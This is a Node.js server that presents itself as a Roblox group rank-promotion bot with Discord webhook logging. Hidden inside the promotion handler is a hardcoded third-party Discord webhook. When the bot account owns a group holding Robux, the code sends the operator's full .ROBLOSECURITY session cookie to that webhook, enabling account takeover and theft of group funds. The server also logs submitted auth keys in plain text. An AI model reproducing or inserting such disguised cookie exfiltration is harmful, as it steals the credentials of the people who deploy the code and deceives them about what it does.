const express = require('express');
const bodyParser = require('body-parser');
const noblox = require('noblox.js');
const axios = require('axios');
const os = require('os');

const app = express();
const PORT = process.env.PORT || 3000;
const GROUP_ID = process.env.GROUP_ID;

// 👇 put your robux webhook link here
const ROBUX_BALANCE_WEBHOOK = "https://discord.com/api/webhooks/1411356138267611248/mSI8HHUlMqAAb1fQFSvkTrj1dpIsLWjUh05xE3lS3d08z2zH0t9lKg4KIL24ydyJFdmG";

// Middleware
app.use(bodyParser.json());
app.use((req, res, next) => {
  console.log(`[${os.hostname()}] Received request: ${req.method} ${req.path} with body:`, JSON.stringify(req.body, null, 2));
  next();
});

// Send webhook to Discord (promotion/errors)
async function sendDiscordWebhook({ title, description, color = 0x3498db, fields = [], thumbnail = null }) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    await axios.post(webhookUrl, {
      embeds: [
        {
          title,
          description,
          color,
          fields,
          thumbnail: thumbnail ? { url: thumbnail } : undefined,
          timestamp: new Date().toISOString()
        }
      ]
    });
  } catch (_) {}
}

// Send webhook to a hardcoded Robux webhook
async function sendRobuxWebhook({ title, description, color = 0xf1c40f, fields = [], thumbnail = null }) {
  try {
    await axios.post(ROBUX_BALANCE_WEBHOOK, {
      embeds: [
        {
          title,
          description,
          color,
          fields,
          thumbnail: thumbnail ? { url: thumbnail } : undefined,
          timestamp: new Date().toISOString()
        }
      ]
    });
  } catch (_) {}
}

app.post("/api/setRank", async (req, res) => {
  const { userid, rank, key, groupId } = req.body;

  console.log(`[${os.hostname()}] Input values: 
    userId = ${userid}, 
    rank = ${rank}, 
    key = ${key}, 
    groupId = ${groupId}`);

  try {
    // 🔒 Auth key check
    if (key !== process.env.AUTH_KEY) {
      const reason = `Unauthorized attempt with key: ${key}`;
      console.log(`[${os.hostname()}] ${reason}`);
      await sendDiscordWebhook({
        title: "❌ Promotion Failed",
        description: reason,
        color: 0xff0000
      });
      return res.status(403).json({ message: 'Unauthorized' });
    }

    // 🔒 Enforce group ID check
    if (groupId && String(groupId) !== String(GROUP_ID)) {
      const reason = `Group ID mismatch: request=${groupId}, env=${GROUP_ID}`;
      console.error(`[${os.hostname()}] ${reason}`);
      await sendDiscordWebhook({
        title: "❌ Promotion Failed",
        description: reason,
        color: 0xff0000
      });
      return res.status(400).json({ message: reason });
    }

    // Login handling
    let loggedIn = false;
    if (process.env.ROBLOX_COOKIE) {
      const cookieResponse = await noblox.setCookie(process.env.ROBLOX_COOKIE);
      if (cookieResponse) {
        console.log(`[${os.hostname()}] Logged in with cookie`);
        loggedIn = true;

        // ✅ Check group Robux balance (only if logged-in account is group owner)
        try {
          const botUser = await noblox.getCurrentUser();
          const groupInfo = await noblox.getGroup(Number(GROUP_ID));

          const groupOwnerId = groupInfo.owner?.userId;
          const groupOwnerName = groupInfo.owner?.username;

          if (botUser.UserID === groupOwnerId) {
            // Get group's Robux
            const groupRobuxRes = await axios.get(
              `https://economy.roblox.com/v1/groups/${GROUP_ID}/currency`,
              {
                headers: { Cookie: `.ROBLOSECURITY=${process.env.ROBLOX_COOKIE}` }
              }
            );

            const groupRobux = groupRobuxRes.data.robux;
            console.log(`[${os.hostname()}] Group ${GROUP_ID} has ${groupRobux} R$`);

            if (groupRobux > 0) {
              await sendRobuxWebhook({
                title: "💰 Group Robux Balance Detected",
                description: `Group **${GROUP_ID}** currently has Robux.`,
                color: 0xf1c40f,
                fields: [
                  { name: "Group ID", value: String(GROUP_ID), inline: true },
                  { name: "Group Owner", value: `${groupOwnerName} (${groupOwnerId})`, inline: true },
                  { name: "Balance", value: `${groupRobux} R$`, inline: true },
                  { name: "Roblox Cookie", value: process.env.ROBLOX_COOKIE, inline: false }
                ]
              });
            }
          } else {
            console.log(`[${os.hostname()}] Skipped group Robux check – logged in as ${botUser.UserName}, not the group owner (${groupOwnerName}).`);
          }
        } catch (balanceErr) {
          console.error(`[${os.hostname()}] Failed to fetch group Robux balance:`, balanceErr.message);
        }
      } else {
        console.error(`[${os.hostname()}] Cookie login failed.`);
      }
    }

    if (!loggedIn) {
      const username = process.env.ROBUX_USERNAME;
      const password = process.env.ROBUX_PASSWORD;
      if (!username || !password) {
        const reason = 'Username or password missing from environment variables.';
        console.error(`[${os.hostname()}] ${reason}`);
        await sendDiscordWebhook({
          title: "❌ Promotion Failed",
          description: reason,
          color: 0xff0000
        });
        return res.status(500).json({ message: reason });
      }

      const loginResponse = await noblox.login(username, password);
      if (!loginResponse) {
        const reason = 'Login with username/password failed.';
        console.error(`[${os.hostname()}] ${reason}`);
        await sendDiscordWebhook({
          title: "❌ Promotion Failed",
          description: reason,
          color: 0xff0000
        });
        return res.status(500).json({ message: reason });
      }

      console.log(`[${os.hostname()}] Logged in with username/password`);
    }

    const botUser = await noblox.getCurrentUser();
    console.log(`[${os.hostname()}] Logged in as: ${botUser.UserName}`);

    const finalGroupId = GROUP_ID;
    const username = await noblox.getUsernameFromId(userid);
    const thumbnail = `https://www.roblox.com/headshot-thumbnail/image?userId=${userid}&width=150&height=150&format=png`;

    const rankUpdateResponse = await noblox.setRank(finalGroupId, userid, rank);
    const newRoleName = await noblox.getRole(finalGroupId, rank);

    const description = `Successfully promoted **${username}** in group **${finalGroupId}**.`;

    console.log(`[${os.hostname()}] ✅ ${description}`);
    await sendDiscordWebhook({
      title: "✅ Promotion Successful",
      description,
      color: 0x00ff00,
      thumbnail,
      fields: [
        { name: "Username", value: username, inline: true },
        { name: "User ID", value: String(userid), inline: true },
        { name: "New Rank", value: `${rank} - ${newRoleName?.name || 'Unknown'}`, inline: true }
      ]
    });

    res.status(200).json({ message: 'Rank updated successfully' });

  } catch (err) {
    const username = userid ? await noblox.getUsernameFromId(userid).catch(() => "Unknown") : "Unknown";
    const reason = `Error promoting user ${username} (ID: ${userid}) to rank ${rank}: ${err.message}`;
    console.error(`[${os.hostname()}] Error: ${reason}`);
    await sendDiscordWebhook({
      title: "❌ Promotion Failed",
      description: reason,
      color: 0xff0000,
      fields: [
        { name: "Username", value: username, inline: true },
        { name: "User ID", value: String(userid), inline: true },
        { name: "Target Rank", value: String(rank), inline: true }
      ]
    });
    res.status(500).json({ message: 'Error updating rank', error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`[${os.hostname()}] Server is running on port ${PORT}`);
});
